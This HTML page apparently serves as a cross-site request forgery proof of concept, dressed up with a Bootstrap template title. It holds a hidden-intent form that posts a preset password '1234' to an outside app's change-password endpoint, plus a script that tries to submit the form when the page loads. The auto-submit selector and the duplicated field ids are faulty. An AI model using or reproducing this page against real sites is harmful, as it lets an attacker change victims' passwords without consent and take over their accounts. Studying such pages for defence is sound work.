<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Narrow1 Jumbotron Template for Bootstrap</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
  </head>

  <body>
<div class="container">
  <h1>Change password</h1>
<div class="panel panel-default login-panel">
  <div class="panel-body">
    <form method="post" class="form-horizontal" action="http://silver-quire.herokuapp.com/change-password">
      <div class="form-group">
        <label for="password" class="col-sm-4 control-label">Password</label>
        <div class="col-sm-4">
          <input id="password_confirmation" type="password" name="user[password]" class="form-control" value="1234"/>
        </div>
      </div>
      <div class="form-group">
        <label for="password_confirmation" class="col-sm-4 control-label">Confirm password</label>
        <div class="col-sm-4">
          <input id="password_confirmation" type="password" name="user[password_confirmation]" class="form-control" value="1234"/>
        </div>
      </div>
      <div class="form-group">
        <div class="col-sm-offset-4 col-sm-4">
          <button type="submit" class="btn btn-primary">Change!</button>
        </div>
      </div>
    </form>
  </div>
</div>
<script>
$(document).ready(function () {
	$('submit').trigger('click');
});
</script>
  </body>
</html>
